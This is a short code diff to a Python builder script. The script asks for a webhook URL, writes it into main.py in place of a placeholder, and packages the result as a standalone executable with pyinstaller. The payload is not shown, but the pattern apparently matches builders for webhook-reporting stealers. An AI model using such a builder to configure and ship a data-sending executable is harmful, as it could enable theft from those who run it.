@@ -4,7 +4,7 @@ import os
 
 webhook = input("What is your webhook? ")
 
-search_text = "run builder.py first :skull:"
+search_text = "run builder.py first"
 
 replace_text = webhook
 
@@ -24,11 +24,8 @@ try:
     else:
         quit()
 
-    try:
-        os.system("pyinstaller --onefile main.py")
-
-    except ModuleNotFoundError:
-        os.system("pip install pyinstaller")
+    os.system("pip install pyinstaller")
+    os.system("pyinstaller --onefile main.py")
 
 except:
     pass
